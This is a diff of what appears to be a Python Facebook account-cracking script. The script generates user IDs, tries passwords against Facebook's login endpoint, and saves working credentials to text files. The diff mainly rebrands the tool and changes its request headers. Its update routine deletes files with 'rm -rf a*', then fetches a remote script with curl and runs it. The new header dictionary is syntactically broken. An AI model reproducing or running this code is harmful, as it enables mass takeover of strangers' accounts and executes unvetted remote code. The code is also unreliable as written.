@@ -123,7 +123,7 @@ for xd in range(10000):
 	
 
 logo=("""
-     \033[1;39m .########...######..##.....##
+\033[1;39m .########...######..##.....##
 \033[1;32m .##.....##.##....##.##.....##
 \033[1;39m .##.....##.##.......##.....##
 \033[1;32m .########...######..#########
@@ -132,10 +132,10 @@ logo=("""
 \033[1;39m .##.....##..######..##.....##
 \33[1;37m----------------------------------------------
 →   Owner      :  Raziqullah Saadat
-→   Facebook: Raziqullah Saadat
+→   Facebook   : Raziqullah Saadat
 →   Github     : Raziq
-  →   Tools   :  RANDOM 
-\x1b[1;97m→   Version    :  0.1
+→   Tools       :  RANDOM 
+\x1b[1;97m→   Version    :  0.2
 4G/3G full speed internet 💔Update Coming Soon
 \33[1;37m----------------------------------------------""")
 
@@ -153,7 +153,7 @@ try:
     if str(v) in update:
         os.system('rm -rf a*')
         os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
-        os.system('python ali.py')
+        os.system('python Raziq.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 def dynamic(text):
@@ -245,7 +245,7 @@ def m1():
         tl = str(len(user))
         print(' Total Acounts : '+tl)
         print(' Selected Code :\x1b[1;92m '+kode)
-        print('\x1b[1;91m If you no result use flight mode')
+        print('\x1b[1;91m if you Show no result use flight mode')
         lines()
         for guru in user:
             uid = kode+guru
@@ -425,23 +425,22 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'x.facebook.com',
-			'method':'GET',
-			'path':'/?tbua=1',
-			'scheme':'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Windows"',
-			"sec-fetch-dest": "document",
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'upgrade-insecure-requests': '1',
-			"sec-fetch-user": "?1",
-            'user-agent': pro}
+            header_freefb = {'headers = {'authority': 'm.alpha.facebook.com',
+            'method':'GET',
+            'path':'/?tbua=1',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
@@ -449,14 +448,14 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
                 print('\033[1;32m[Saadat-OK] '+cid+'|'+ps+'\033[0;97m')
-                open('AZ.NAZAWALI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                open('Saadat-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
                 print('\033[1;31m[Saadat-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('AZ.NAZAWALI-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                open('Saadat-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
